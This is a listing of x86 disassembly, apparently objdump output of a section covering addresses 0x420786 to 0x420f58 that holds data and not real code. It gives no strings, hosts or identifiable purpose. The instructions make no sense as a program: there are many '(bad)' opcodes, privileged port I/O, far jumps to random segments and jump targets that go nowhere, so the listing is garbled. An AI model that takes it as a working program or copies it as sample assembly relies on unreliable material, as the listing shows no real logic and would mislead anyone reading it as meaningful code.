  420786:	inc    eax
  420787:	and    BYTE PTR [edi+0x62],bh
  42078a:	jl     0x420781
  42078c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42078d:	test   eax,0xac3f3768
  420792:	(bad)  
  420793:	rcl    eax,cl
  420795:	(bad)  
  420796:	ficomp DWORD PTR [ecx-0x6d]
  420799:	shl    BYTE PTR [ebx+0x31],1
  42079c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42079d:	mov    edi,0x781a9135
  4207a2:	fisttp DWORD PTR [eax]
  4207a4:	pop    es
  4207a5:	in     eax,0xf3
  4207a7:	sti    
  4207a8:	cmp    edi,esp
  4207aa:	imul   ebp,DWORD PTR [ebx+0x2020c274],0xc388c760
  4207b4:	mov    eax,0xc03ba2f5
  4207b9:	mov    eax,0x4dfc2e81
  4207be:	call   0x50d1bd69
  4207c3:	mov    ds:0xd1e233ba,eax
  4207c8:	pop    esi
  4207c9:	add    ebx,0x6e
  4207cc:	je     0x4207e7
  4207ce:	(bad)  
  4207cf:	jl     0x4207e7
  4207d1:	adc    BYTE PTR [ebx-0x6f],al
  4207d4:	sbb    ebx,edx
  4207d6:	pop    ebp
  4207d7:	ds dec ecx
  4207d9:	dec    edi
  4207da:	scas   al,BYTE PTR es:[edi]
  4207db:	les    eax,FWORD PTR [ebx]
  4207dd:	xchg   ebp,eax
  4207de:	into   
  4207df:	adc    DWORD PTR [edi],ebp
  4207e1:	dec    ebp
  4207e2:	stc    
  4207e3:	and    eax,DWORD PTR [esi]
  4207e5:	push   eax
  4207e6:	cmp    al,BYTE PTR [ebx]
  4207e8:	cwde   
  4207e9:	es fdivrp st(7),st
  4207ec:	in     al,0x36
  4207ee:	dec    eax
  4207ef:	mov    gs,ebp
  4207f1:	inc    edx
  4207f2:	jbe    0x4207f7
  4207f4:	pop    ebx
  4207f5:	adc    DWORD PTR [eax],ebx
  4207f7:	rol    BYTE PTR [eax+eiz*1-0x4d59b3a],cl
  4207fe:	sub    al,0x58
  420800:	adc    ebx,0xffffffd0
  420803:	in     al,0x29
  420805:	pop    edx
  420806:	pushf  
  420807:	stos   DWORD PTR es:[edi],eax
  420808:	and    al,0xb8
  42080a:	ror    DWORD PTR [edx-0xe],1
  42080d:	xchg   edi,eax
  42080e:	rol    BYTE PTR [eax],0x0
	...
  420819:	add    BYTE PTR [edi+0x4c],dh
  42081c:	idiv   dh
  42081e:	(bad)  
  42081f:	(bad)  
  420820:	jg     0x4207ef
  420822:	mul    BYTE PTR [ebx+0x227d2ffd]
  420828:	pop    esp
  420829:	xchg   BYTE PTR ds:0xfd000185,al
  42082f:	add    DWORD PTR [eax],eax
  420831:	add    BYTE PTR [ebx-0x2a],al
  420834:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420835:	cld    
  420836:	call   0xdb14:0x1e0f7631
  42083d:	call   0x9f54:0xc55c3735
  420844:	or     ch,BYTE PTR [ecx-0x75]
  420847:	sub    DWORD PTR [eax+0x37],ecx
  42084a:	into   
  42084b:	neg    ebx
  42084d:	jmp    0x60b8:0xbdd8b810
  420854:	xlat   BYTE PTR ds:[ebx]
  420855:	add    BYTE PTR ds:0x812ee0d2,dl
  42085b:	int3   
  42085c:	shr    DWORD PTR [eax-0x26],cl
  42085f:	mov    ebp,0xc5d74967
  420864:	fisubr WORD PTR [edx+0x45ff0e88]
  42086a:	scas   al,BYTE PTR es:[edi]
  42086b:	stos   BYTE PTR es:[edi],al
  42086c:	mov    al,ds:0x3bc92b
  420871:	adc    ebp,DWORD PTR [eax-0x63684597]
  420877:	imul   eax,DWORD PTR [esp+edi*8],0xa7abd66e
  42087e:	mov    edi,0x9279a62
  420883:	xchg   esp,eax
  420884:	pusha  
  420885:	sti    
  420886:	inc    edx
  420887:	or     esi,DWORD PTR [edx+ebx*2+0x14c01da9]
  42088e:	imul   edx,ebx,0x9c733a6
  420894:	(bad)  
  420895:	push   ecx
  420896:	xchg   DWORD PTR [ecx-0x56],ebp
  420899:	mov    esp,0xe68df94a
  42089e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42089f:	sbb    al,0xea
  4208a1:	jmp    0x4231:0x50904f85
  4208a8:	pop    ss
  4208a9:	lock jle 0x4208da
  4208ac:	outs   dx,BYTE PTR ds:[esi]
  4208ad:	(bad)  
  4208ae:	xor    al,BYTE PTR [ebp-0x1a]
  4208b1:	jmp    0xa69b53af
  4208b6:	cmpps  xmm1,XMMWORD PTR [esp+edx*2],0x24
  4208bb:	jle    0x4208a8
  4208bd:	lock imul ecx,ebx,0xdbb782d2
  4208c4:	mov    esp,0xf94a096f
  4208c9:	inc    ebx
  4208ca:	and    BYTE PTR ds:0x479b8bd4,bh
  4208d0:	fld    st(4)
  4208d2:	sub    ebx,esi
  4208d4:	xchg   eax,edx
  4208d6:	jmp    0x420945
  4208d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208d9:	int3   
  4208da:	inc    ecx
  4208db:	loopne 0x4208da
  4208dd:	jg     0x420926
  4208df:	mov    dl,0x4d
  4208e1:	mov    ch,BYTE PTR [ecx-0x2b]
  4208e4:	or     al,0x56
  4208e6:	leave  
  4208e7:	not    DWORD PTR [ecx+0x70]
  4208ea:	test   al,0xd0
  4208ec:	mov    ch,0x61
  4208ee:	fild   WORD PTR [ecx+0x40541e42]
  4208f4:	xchg   esi,eax
  4208f5:	sub    eax,0x7162afeb
  4208fa:	js     0x420913
  4208fc:	jmp    0xebf3:0x5b1f6649
  420903:	mov    edx,0x36977685
  420908:	add    BYTE PTR [edi-0x54],dh
  42090b:	sub    eax,0xc06d3726
  420910:	ja     0x420941
  420912:	xor    ch,dh
  420914:	arpl   WORD PTR [edx+0x5e7f91d3],bp
  42091a:	xchg   ebp,eax
  42091b:	xchg   ecx,eax
  42091c:	jb     0x42093d
  42091e:	jb     0x4208f2
  420920:	cdq    
  420921:	or     DWORD PTR [edx+eax*8],edi
  420924:	ret    0xc7d6
  420927:	pushf  
  420928:	iret   
  420929:	or     edx,esp
  42092b:	stc    
  42092c:	and    ah,cl
  42092e:	and    DWORD PTR [eax],0xffffff84
  420931:	ror    ch,0xa6
  420934:	shl    DWORD PTR [ebx-0x30],0xac
  420938:	jle    0x420981
  42093a:	popa   
  42093b:	xor    cl,BYTE PTR [ebp+0x2a]
  42093e:	call   0x99a:0x84f14ca0
  420945:	shl    DWORD PTR [ebx+0x6c],0x95
  420949:	ja     0x42091f
  42094b:	pop    ds
  42094c:	jmp    FWORD PTR [esi-0xc]
  42094f:	in     al,dx
  420950:	daa    
  420951:	or     DWORD PTR [edi+0x31],0xdf801efe
  420958:	xchg   esp,eax
  420959:	inc    ebx
  42095a:	imul   ecx,DWORD PTR [ecx-0x4e441055],0x6abc6d99
  420964:	mov    bl,0xcb
  420966:	mov    al,0xe6
  420968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420969:	pop    edx
  42096a:	fsubr  QWORD PTR [eax]
  42096c:	mov    eax,ds:0x5eabaa89
  420971:	xchg   ebp,eax
  420972:	dec    esp
  420973:	jg     0x420966
  420975:	mov    eax,0xe0f5e88
  42097a:	cdq    
  42097b:	repz bound ecx,QWORD PTR ds:0xc771bc28
  420982:	nop
  420983:	outs   dx,BYTE PTR ds:[esi]
  420984:	xor    al,BYTE PTR ds:[esi+0x21]
  420988:	xchg   ebx,eax
  420989:	shr    DWORD PTR [ecx],1
  42098b:	imul   esi,ecx,0xffffff85
  42098e:	xor    ebx,edx
  420990:	xchg   edx,eax
  420991:	cmp    eax,0x535fa62f
  420996:	sub    eax,0x6bd79855
  42099b:	in     al,dx
  42099c:	push   0x3a7db9a8
  4209a1:	inc    esi
  4209a2:	std    
  4209a3:	or     al,0x9c
  4209a5:	pop    ecx
  4209a6:	(bad)  
  4209a7:	ja     0x42096a
  4209a9:	fist   DWORD PTR ds:0xf2940066
  4209af:	icebp  
  4209b0:	stos   DWORD PTR es:[edi],eax
  4209b1:	stos   BYTE PTR es:[edi],al
  4209b2:	xor    cl,bh
  4209b4:	dec    esp
  4209b5:	pushf  
  4209b6:	out    dx,al
  4209b7:	in     eax,dx
  4209b8:	in     eax,0x1b
  4209ba:	push   esi
  4209bb:	(bad)  
  4209bc:	ds and al,0xe
  4209bf:	mov    edi,0x8ff739f7
  4209c4:	push   eax
  4209c5:	(bad)  
  4209c6:	stc    
  4209c7:	xlat   BYTE PTR ds:[ebx]
  4209c8:	mov    bh,0x26
  4209ca:	(bad)  
  4209cb:	pop    ebp
  4209cc:	je     0x420997
  4209ce:	adc    dh,dl
  4209d0:	ret    0x8c83
  4209d3:	ficomp DWORD PTR [esi+0x10f7a0ac]
  4209d9:	or     al,0x98
  4209db:	mov    esi,0xa2f460ad
  4209e0:	cmp    BYTE PTR ds:0xffe29c7a,bl
  4209e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209e7:	jae    0x4209ab
  4209e9:	fild   WORD PTR [edi+0x28d47182]
  4209ef:	dec    eax
  4209f0:	pop    eax
  4209f1:	jp     0x420a53
  4209f3:	loopne 0x420a65
  4209f5:	jo     0x420a53
  4209f7:	cmc    
  4209f8:	or     BYTE PTR [ebx+0x63],0x2c
  4209fc:	fwait
  4209fd:	lods   al,BYTE PTR ds:[esi]
  4209fe:	push   es
  4209ff:	sub    al,0xa2
  420a01:	bound  edx,QWORD PTR [ebx]
  420a03:	outs   dx,DWORD PTR ds:[esi]
  420a04:	shl    DWORD PTR [eax],cl
  420a06:	mov    ebx,0xe1ae601a
  420a0b:	mov    ebp,0xbe6d22cc
  420a10:	adc    BYTE PTR [edx+eax*2],dl
  420a13:	ins    BYTE PTR es:[edi],dx
  420a14:	xchg   esp,eax
  420a15:	(bad)  
  420a16:	push   0x198cfdd2
  420a1b:	fbstp  TBYTE PTR [ecx-0x2b]
  420a1e:	push   ebx
  420a1f:	(bad)  
  420a21:	push   0x19
  420a23:	jmp    0x32917e2b
  420a28:	lods   eax,DWORD PTR ds:[esi]
  420a29:	xchg   ecx,eax
  420a2a:	out    dx,al
  420a2b:	pop    es
  420a2c:	lock pusha 
  420a2e:	pop    ebp
	...
  420a37:	add    BYTE PTR [eax],al
  420a39:	add    BYTE PTR [edi],al
  420a3b:	sbb    cl,BYTE PTR [ecx-0x686462e6]
  420a41:	pop    ds
  420a42:	(bad)  
  420a44:	std    
  420a45:	jg     0x4209c7
  420a47:	adc    cl,ch
  420a49:	cwde   
  420a4a:	add    al,BYTE PTR [edi+0x1fd0001]
  420a50:	add    BYTE PTR [eax],al
  420a52:	sub    ecx,esp
  420a54:	sub    DWORD PTR [edx],ebx
  420a56:	mov    esi,0xacd95dc3
  420a5b:	call   0x72e8affb
  420a60:	add    bl,dh
  420a62:	mov    ah,0xb4
  420a64:	or     bl,bl
  420a66:	call   0x585b:0x11476a34
  420a6d:	pop    edx
  420a6e:	mov    esp,0x40f57437
  420a73:	mov    ch,BYTE PTR [ebx]
  420a75:	jno    0x420a30
  420a77:	fcom   DWORD PTR [edi-0x2d]
  420a7a:	test   DWORD PTR [eax+0x4b],0x43bcfe85
  420a81:	int    0x76
  420a83:	cld    
  420a84:	fstp   DWORD PTR [edi]
  420a86:	xor    BYTE PTR [edx-0x5f],ch
  420a89:	push   0xe5f128da
  420a8e:	cmp    DWORD PTR [edx+0x6fcbb48d],ecx
  420a94:	fstp   DWORD PTR [ecx]
  420a96:	je     0x420b0a
  420a98:	aad    0x62
  420a9a:	ret    0xdda2
  420a9d:	sub    al,0x29
  420a9f:	cdq    
  420aa0:	out    0xbf,eax
  420aa2:	push   edi
  420aa3:	mov    edi,0x118e3ccf
  420aa8:	lods   al,BYTE PTR ds:[esi]
  420aa9:	retf   0x9f4
  420aac:	add    BYTE PTR [esp+ecx*4],0xc0
  420ab0:	jmp    0x35d2eea7
  420ab5:	leave  
  420ab6:	push   edx
  420ab7:	sbb    esi,esp
  420ab9:	test   al,0x34
  420abb:	int    0xb5
  420abd:	dec    ebx
  420abe:	imul   ecx,DWORD PTR [ebp+0x4b129afb],0x5c
  420ac5:	je     0x420b3b
  420ac7:	or     eax,0x28c1efb7
  420acc:	push   esp
  420acd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ace:	jl     0x420b15
  420ad0:	lds    eax,FWORD PTR [edi-0x58b16985]
  420ad6:	mov    dh,0x53
  420ad8:	aaa    
  420ad9:	add    eax,DWORD PTR [esi]
  420adb:	sbb    BYTE PTR ss:[ebx],0x2c
  420adf:	dec    ebp
  420ae0:	idiv   ch
  420ae2:	fst    st(5)
  420ae4:	jo     0x420b65
  420ae6:	arpl   WORD PTR [edx-0x726fe238],bx
  420aec:	fsubr  QWORD PTR [ebx+0x2a]
  420aef:	mov    bh,dh
  420af1:	pop    es
  420af2:	push   edx
  420af3:	add    esi,ebp
  420af5:	push   edi
  420af6:	adc    ebx,DWORD PTR [edx]
  420af8:	xor    BYTE PTR [edi-0x2e],bh
  420afb:	gs in  al,dx
  420afd:	rcr    BYTE PTR [esi+0x28f2bdcd],0xbb
  420b04:	imul   ecx,DWORD PTR [esi],0x5e
  420b07:	or     al,BYTE PTR [edi-0x14]
  420b0a:	mov    bl,0x5
  420b0c:	or     al,0xbb
  420b0e:	sub    esi,eax
  420b10:	add    eax,0xc36d188
  420b15:	jp     0x420a99
  420b17:	push   esp
  420b18:	xchg   esi,eax
  420b19:	xor    DWORD PTR [esp+edi*2-0x7c],0xffffffdc
  420b1e:	dec    edi
  420b1f:	sti    
  420b20:	push   ecx
  420b21:	(bad)
  420b24:	xor    eax,0xd4e56c50
  420b29:	arpl   WORD PTR [esi+0x7],ax
  420b2c:	stos   BYTE PTR es:[edi],al
  420b2d:	ins    DWORD PTR es:[edi],dx
  420b2e:	outs   dx,BYTE PTR ds:[esi]
  420b2f:	or     bh,cl
  420b31:	shr    BYTE PTR [esi+0x68971964],cl
  420b37:	mov    bl,0x91
  420b39:	out    0x37,al
  420b3b:	push   esp
  420b3c:	daa    
  420b3d:	add    eax,0x148eb382
  420b42:	xchg   ebp,eax
  420b43:	mov    ebx,0x38bab113
  420b48:	jae    0x420bb5
  420b4a:	adc    BYTE PTR [edi-0x556f8980],0x5d
  420b51:	popf   
  420b52:	mov    ch,0xae
  420b54:	inc    ecx
  420b55:	pop    edx
  420b56:	sbb    DWORD PTR [edi],ebx
  420b58:	xchg   esp,eax
  420b59:	adc    cl,bh
  420b5b:	push   0xffffffd4
  420b5d:	xchg   edi,eax
  420b5e:	mov    al,ds:0xb0666059
  420b63:	push   ss
  420b64:	push   ds
  420b65:	and    ebx,edi
  420b67:	jb     0x420b70
  420b69:	in     al,0x29
  420b6b:	and    eax,0xe4e77788
  420b70:	popa   
  420b71:	arpl   WORD PTR [ebx+0xa],sp
  420b74:	or     al,0x3a
  420b76:	xchg   ebp,eax
  420b77:	or     dl,BYTE PTR fs:[edi]
  420b7a:	and    eax,0xa6a7e496
  420b7f:	jge    0x420b70
  420b81:	imul   BYTE PTR [ebx-0x42]
  420b84:	cs mov ebx,0xf064dad3
  420b8a:	out    0xb1,al
  420b8c:	retf   
  420b8d:	aaa    
  420b8e:	out    dx,al
  420b8f:	jno    0x420b28
  420b91:	ins    DWORD PTR es:[edi],dx
  420b92:	jae    0x420bc9
  420b94:	inc    ecx
  420b95:	sahf   
  420b96:	sbb    DWORD PTR [ebx],eax
  420b98:	outs   dx,DWORD PTR ds:[esi]
  420b99:	mov    esp,0xa58701ca
  420b9e:	sub    dh,dh
  420ba0:	mov    eax,0xcb9ca4e5
  420ba5:	pusha  
  420ba6:	fwait
  420ba7:	xchg   edx,eax
  420ba8:	dec    ebx
  420ba9:	jecxz  0x420b70
  420bab:	jno    0x420bf8
  420bad:	cld    
  420bae:	jno    0x420b87
  420bb0:	fidiv  DWORD PTR [edi+0x67]
  420bb3:	cld    
  420bb4:	aaa    
  420bb5:	pop    ebx
  420bb6:	sbb    edx,DWORD PTR [edx]
  420bb8:	dec    ebp
  420bb9:	mov    ecx,0x3cdf1628
  420bbe:	nop
  420bbf:	xlat   BYTE PTR ds:[ebx]
  420bc0:	jge    0x420b86
  420bc2:	ss dec esp
  420bc4:	and    al,0x2
  420bc6:	outs   dx,BYTE PTR ds:[esi]
  420bc7:	and    ebx,DWORD PTR ds:0x690be23b
  420bcd:	pop    esp
  420bce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bcf:	fcomp  DWORD PTR [ebp+0x2a]
  420bd2:	imul   eax,DWORD PTR [edi],0xfffffff0
  420bd5:	dec    ebx
  420bd6:	sahf   
  420bd7:	out    dx,eax
  420bd8:	push   0xffffffc7
  420bda:	mov    ch,0x78
  420bdc:	out    0x7,al
  420bde:	push   esp
  420bdf:	std    
  420be0:	ds call 0x8085:0x10ff9583
  420be8:	cdq    
  420be9:	dec    ebx
  420bea:	in     eax,dx
  420beb:	ds nop
  420bed:	stos   BYTE PTR es:[edi],al
  420bee:	jnp    0x420c38
  420bf0:	adc    edi,edi
  420bf2:	ds add eax,0x36e3ec7f
  420bf8:	aam    0x52
  420bfa:	or     esi,DWORD PTR [ecx-0x3bfec82]
  420c00:	jmp    0x59207bdf
  420c05:	pop    ebx
  420c06:	or     eax,DWORD PTR [eax-0x80]
  420c09:	leave  
  420c0a:	leave  
  420c0b:	div    eax
  420c0d:	popa   
  420c0e:	push   ebx
  420c0f:	xchg   edi,eax
  420c10:	xor    al,0xd5
  420c12:	jmp    0x420b95
  420c14:	ins    BYTE PTR es:[edi],dx
  420c15:	fsub   DWORD PTR [esi]
  420c17:	fwait
  420c18:	inc    eax
  420c19:	mov    esp,0xf6c64604
  420c1e:	mov    edi,0xae75529f
  420c23:	pushf  
  420c24:	mov    al,0xeb
  420c26:	jno    0x420be1
  420c28:	xlat   BYTE PTR ds:[ebx]
  420c29:	in     eax,0x2d
  420c2b:	stos   BYTE PTR es:[edi],al
  420c2c:	jno    0x420c3f
  420c2e:	xor    bl,BYTE PTR [ebx+edi*2-0x7c78ec48]
  420c35:	jmp    0x9fe6927b
  420c3a:	loopne 0x420c2e
  420c3c:	sub    bl,ch
  420c3e:	loopne 0x420cb1
  420c40:	aad    0xed
  420c42:	jg     0x420ca8
  420c44:	pop    edx
  420c45:	clc    
  420c46:	pushf  
  420c47:	xchg   al,ch
  420c49:	push   es
  420c4a:	mov    bl,BYTE PTR [edi]
  420c4c:	arpl   WORD PTR [ebx],bx
  420c4e:	sbb    eax,0x0
  420c53:	add    BYTE PTR [eax],al
  420c55:	add    BYTE PTR [eax],al
  420c57:	add    BYTE PTR [eax],al
  420c59:	add    BYTE PTR [esi],bl
  420c5b:	add    al,0xa7
  420c5d:	(bad)  
  420c5e:	mov    edi,0x7bdd7ee7
  420c63:	int    0x75
  420c65:	mov    edx,fs
  420c67:	das    
  420c68:	sbb    ebx,DWORD PTR [edi+edi*8]
  420c6b:	mov    BYTE PTR [ecx],al
  420c6d:	add    ch,bh
  420c6f:	add    DWORD PTR [eax],eax
  420c71:	add    BYTE PTR [eax+0x32],dl
  420c74:	push   0xffffffa0
  420c76:	dec    ebp
  420c77:	ret    
  420c78:	sti    
  420c79:	repz aam 0x2b
  420c7c:	adc    BYTE PTR [edx],al
  420c7e:	mov    bl,0x7a
  420c80:	shl    BYTE PTR [ecx+0x63],1
  420c83:	xlat   BYTE PTR ds:[ebx]
  420c84:	mov    ecx,0xb44a0919
  420c89:	test   eax,0x78697210
  420c8e:	mov    ah,0xc1
  420c90:	xbegin 0x42ef5910
  420c96:	(bad)  
  420c97:	pop    ss
  420c98:	ret    
  420c99:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  420c9b:	in     al,dx
  420c9c:	lea    ebx,[ebx+0x153af964]
  420ca2:	mov    ds:0xe8525791,al
  420ca7:	jmp    0x420ce0
  420ca9:	nop
  420caa:	and    ebx,edx
  420cac:	xchg   esp,eax
  420cad:	sar    BYTE PTR [eax-0x2765f77c],cl
  420cb3:	sbb    al,0x0
  420cb5:	and    eax,0xbe385c56
  420cba:	lods   al,BYTE PTR ds:[esi]
  420cbb:	jbe    0x420d0c
  420cbd:	jae    0x420cd8
  420cbf:	icebp  
  420cc0:	push   0xa17a52b
  420cc5:	jns    0x420cb4
  420cc7:	loope  0x420d45
  420cc9:	in     eax,dx
  420cca:	cmc    
  420ccb:	stc    
  420ccc:	xor    BYTE PTR [ebx],cl
  420cce:	inc    esp
  420ccf:	scas   eax,DWORD PTR es:[edi]
  420cd0:	fs call 0x1de97b08
  420cd6:	sub    DWORD PTR [edx+0x3d4a8d9b],ebx
  420cdc:	scas   eax,DWORD PTR es:[edi]
  420cdd:	mov    esp,0x45b0a755
  420ce2:	int3   
  420ce3:	fidivr WORD PTR [ecx]
  420ce5:	pop    ebp
  420ce6:	xchg   esi,eax
  420ce7:	outs   dx,DWORD PTR ds:[esi]
  420ce8:	mov    ebp,0xdf01ff8
  420ced:	lahf   
  420cee:	hlt    
  420cef:	xchg   esi,eax
  420cf0:	test   BYTE PTR [ecx-0x40a08ac4],cl
  420cf6:	xor    cl,BYTE PTR [ecx]
  420cf8:	dec    eax
  420cf9:	mov    bh,0x2
  420cfb:	inc    edx
  420cfc:	test   dh,al
  420cfe:	mov    ebp,0x834b60b3
  420d03:	sub    eax,0x2045a72c
  420d08:	fst    QWORD PTR [ebp+0x2d412531]
  420d0e:	ins    DWORD PTR es:[edi],dx
  420d0f:	es xchg ebp,eax
  420d11:	push   ecx
  420d12:	fnsave ds:0xf201a6a2
  420d18:	sbb    edi,DWORD PTR [edx]
  420d1a:	jnp    0x420cc8
  420d1c:	jmp    0xb3bdcfe7
  420d21:	pop    edx
  420d22:	cs in  eax,dx
  420d24:	push   eax
  420d25:	jne    0x420d38
  420d27:	push   ss
  420d28:	adc    dl,BYTE PTR [eax-0x29]
  420d2b:	pop    ds
  420d2c:	pop    ds
  420d2d:	push   ebp
  420d2e:	clc    
  420d2f:	or     BYTE PTR [ebx],dl
  420d31:	lods   al,BYTE PTR ds:[esi]
  420d32:	mov    eax,ds:0xb0d3548c
  420d37:	push   esi
  420d38:	inc    esi
  420d39:	push   0x22651562
  420d3e:	fsub   QWORD PTR [esp+eax*2]
  420d41:	test   al,0x73
  420d43:	in     eax,dx
  420d44:	xchg   BYTE PTR [edx],ah
  420d46:	dec    ebp
  420d47:	xor    BYTE PTR [edx+edx*2+0x7f],ch
  420d4b:	add    al,0xbc
  420d4d:	mov    ebx,0xba2764e8
  420d52:	mov    bh,0x90
  420d54:	mov    edx,0x8fa69a74
  420d59:	cmovae ebx,ebx
  420d5c:	cdq    
  420d5d:	gs mov ebp,ecx
  420d60:	inc    BYTE PTR [edx+0x4707a084]
  420d66:	aam    0x2f
  420d68:	pop    edi
  420d69:	enter  0x6c26,0xa8
  420d6d:	mov    bl,0x35
  420d6f:	mov    BYTE PTR [esi],dl
  420d71:	les    esi,FWORD PTR [edx+0x3899422d]
  420d77:	push   esi
  420d78:	lahf   
  420d79:	jns    0x420d4e
  420d7b:	pop    es
  420d7c:	psubsw mm1,mm0
  420d7f:	fst    DWORD PTR es:[ecx]
  420d82:	loop   0x420ddb
  420d84:	xchg   BYTE PTR [edx],dh
  420d86:	sub    BYTE PTR [esi-0x359b27ee],dh
  420d8c:	mov    edi,0xd2b4e445
  420d91:	jns    0x420d84
  420d93:	retf   
  420d94:	dec    ebp
  420d95:	xor    BYTE PTR [ecx-0xe7aa296],dl
  420d9b:	jno    0x420dc9
  420d9d:	and    dh,BYTE PTR [esi+ebx*8]
  420da0:	mov    fs,eax
  420da2:	fild   QWORD PTR ss:[edi+edi*8+0x62]
  420da7:	stc    
  420da8:	adc    eax,0x46103334
  420dad:	and    bh,BYTE PTR [eax-0x2d]
  420db0:	cwde   
  420db1:	sar    BYTE PTR [esi+0x43],1
  420db4:	jmp    0xe43e8675
  420db9:	pop    esi
  420dba:	call   0xe7db:0x8981b769
  420dc1:	out    0x8f,eax
  420dc3:	jmp    0x420dd7
  420dc5:	das    
  420dc6:	rol    BYTE PTR [ebp-0x30],cl
  420dc9:	repz popw es
  420dcc:	repz jmp 0xec9a:0x7d3ce916
  420dd4:	xchg   esi,edx
  420dd6:	push   eax
  420dd7:	mov    ah,0xc5
  420dd9:	jae    0x420db2
  420ddb:	fldenv [esi+0x5b8f1bca]
  420de1:	mov    ah,0x3a
  420de3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420de4:	(bad)  
  420de5:	xchg   edx,eax
  420de6:	aas    
  420de7:	or     al,0x21
  420de9:	jle    0x420d84
  420deb:	mov    dh,0xcd
  420ded:	arpl   WORD PTR [ebp-0x292dd190],di
  420df3:	cld    
  420df4:	mov    gs,WORD PTR [eax]
  420df6:	mov    bh,0x8
  420df8:	dec    ebx
  420df9:	pop    esp
  420dfa:	mov    bh,0x61
  420dfc:	push   ss
  420dfd:	cmc    
  420dfe:	aam    0x89
  420e00:	add    ebx,DWORD PTR [esi]
  420e02:	pop    ds
  420e03:	or     DWORD PTR [ebx],ebp
  420e05:	mov    DWORD PTR [ebx],esp
  420e07:	std    
  420e08:	sbb    dh,BYTE PTR [ecx+0x4690e530]
  420e0e:	jecxz  0x420e0f
  420e10:	mov    edi,0x1d776dbc
  420e15:	int3   
  420e16:	dec    esp
  420e17:	mov    BYTE PTR [eax-0x37],cl
  420e1a:	sbb    eax,0xe042c26f
  420e1f:	mov    ?,WORD PTR fs:[esi]
  420e22:	in     al,dx
  420e23:	pop    ds
  420e24:	push   ecx
  420e25:	ja     0x420ddb
  420e27:	sub    bl,dl
  420e29:	(bad)  
  420e2a:	and    ah,bh
  420e2c:	add    bl,BYTE PTR [ecx]
  420e2e:	test   BYTE PTR [edi-0x210cdcde],ch
  420e34:	xchg   DWORD PTR [ecx-0x60],ecx
  420e37:	push   esp
  420e38:	aaa    
  420e39:	adc    ecx,DWORD PTR [edx-0x32ece04]
  420e3f:	and    al,0xcf
  420e41:	fs mov esp,ds
  420e44:	cmp    DWORD PTR ds:0x8dc0370f,edi
  420e4a:	lods   eax,DWORD PTR ds:[esi]
  420e4b:	cld    
  420e4c:	jg     0x420e04
  420e4e:	ins    BYTE PTR es:[edi],dx
  420e4f:	mov    bh,0xb8
  420e51:	xor    ch,ah
  420e53:	jp     0x420e39
  420e55:	mov    esp,0x2fe953c0
  420e5a:	mov    dl,0x27
  420e5c:	dec    ebx
  420e5d:	xchg   DWORD PTR [edx+edx*4-0x6a],eax
  420e61:	inc    ecx
  420e62:	imul   ebx,DWORD PTR [edx-0x2ffb470b],0x3feca9b9
  420e6c:	popa   
  420e6d:	pop    DWORD PTR cs:[eax]
	...
  420e78:	add    BYTE PTR [eax],al
  420e7a:	js     0x420e05
  420e7c:	hlt    
  420e7d:	mov    al,0xf5
  420e7f:	std    
  420e80:	jl     0x420e4b
  420e82:	xor    dl,0x39
  420e85:	jg     0x420ec4
  420e87:	inc    esi
  420e88:	out    0xc2,al
  420e8a:	cld    
  420e8b:	mov    al,BYTE PTR [ecx]
  420e8d:	add    ch,bh
  420e8f:	add    DWORD PTR [eax],eax
  420e91:	add    BYTE PTR [edi-0x7a],dh
  420e94:	adc    DWORD PTR [ebp-0x4c21fb4c],eax
  420e9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e9b:	jbe    0x420ee4
  420e9d:	mov    al,ds:0x4ddf200f
  420ea2:	add    DWORD PTR [esi+0x70f34766],esi
  420ea8:	ja     0x420ee4
  420eaa:	addr16 addr16 jmp 0x5159:0xe6110e22
  420eb3:	adc    al,0x41
  420eb5:	mov    WORD PTR [ebp-0x2b33e27b],cs
  420ebb:	jge    0x420ebc
  420ebd:	jl     0x420f09
  420ebf:	inc    eax
  420ec0:	in     eax,dx
  420ec1:	mov    ch,0x8
  420ec3:	sub    edi,ebx
  420ec5:	xor    ebx,DWORD PTR ds:0xaf168065
  420ecb:	sahf   
  420ecc:	push   ss
  420ecd:	lock shl DWORD PTR [ecx+0xc],0xea
  420ed2:	in     al,0xb
  420ed4:	frstor [ecx+ecx*4]
  420ed7:	ss out dx,al
  420ed9:	aad    0xe9
  420edb:	mov    eax,ds:0xa4da6ead
  420ee0:	fld    TBYTE PTR [ecx]
  420ee2:	into   
  420ee3:	call   0x483d259
  420ee8:	sub    eax,0x2b4dfb46
  420eed:	aaa    
  420eee:	jp     0x420ef8
  420ef0:	not    BYTE PTR [esi+0x644c5e3f]
  420ef6:	adc    eax,0xf5a390a6
  420efb:	sar    DWORD PTR [ecx-0x4f],1
  420efe:	bnd je 0x420f11
  420f01:	mov    dl,0x11
  420f03:	pop    edx
  420f04:	mov    ebp,0xb5bf1228
  420f09:	xchg   BYTE PTR [eax+0x32c5c8c7],bl
  420f0f:	or     al,0x7
  420f11:	adc    al,0x55
  420f13:	ffreep st(5)
  420f15:	cmp    DWORD PTR ds:0x5c356135,ebp
  420f1b:	fstcw  WORD PTR [ebp-0x23]
  420f1f:	mov    al,0x4e
  420f21:	mov    bl,0x86
  420f23:	jmp    0x16ae59dd
  420f28:	and    BYTE PTR [edi+0x2c],dl
  420f2b:	adc    DWORD PTR [ebx],0xffffff8a
  420f2e:	jecxz  0x420f85
  420f30:	push   esp
  420f31:	sti    
  420f32:	stos   DWORD PTR es:[edi],eax
  420f33:	inc    esi
  420f34:	test   eax,edx
  420f36:	sbb    ebp,0x1b65e532
  420f3c:	mov    eax,ds:0xd191fcb7
  420f41:	fs addr16 xchg edx,eax
  420f44:	aam    0x46
  420f46:	mov    al,0x9c
  420f48:	fisubr DWORD PTR [eax+eax*8-0x39c229e9]
  420f4f:	jp     0x420ef1
  420f51:	stos   DWORD PTR es:[edi],eax
  420f52:	enter  0x8073,0xa0
  420f56:	and    esi,DWORD PTR [esi]
  420f58:	fwait
